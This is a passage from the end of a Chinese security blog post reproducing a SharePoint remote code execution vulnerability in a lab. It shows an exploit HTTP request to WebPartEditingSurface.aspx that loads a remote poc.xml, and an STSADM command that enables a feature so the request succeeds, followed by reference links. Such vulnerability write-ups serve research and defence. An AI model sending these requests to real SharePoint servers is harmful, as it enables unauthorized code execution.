GET /_layouts/15/WebPartEditingSurface.aspx?WebPartUrl=http://.../poc.xml&Url=/_catalogs/masterpage/seattle.master HTTP/1.1
```

然而报错了

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VFKOe4RacJnic1OshImX1LUjVpLy0G8UbLRxvUK6HXia0AkMQFpYggicgNF4mia6tU9agXPDor4Sficlw/640?wx_fmt=png)

我们需要用 SMP 打开了个 feature

```
PS C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\FEATURES> STSADM.EXE -o activatefeat
ure -filename .\PublishingResources\Feature.xml -url http://192.168.2.107:8082/ -force
```

此时再重新发包，即可成功复现。

参考文章：  

https://paper.seebug.org/1424/  

https://paper.seebug.org/1456/

https://paper.seebug.org/1430/

https://i.blackhat.com/USA-20/Wednesday/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security-wp.pdf

https://docs.microsoft.com/en-us/dotnet/api/system.componentmodel.designerserializationvisibilityattribute?view=net-5.0

https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance

https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html

     ▼

更多精彩推荐，请关注我们

▼

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)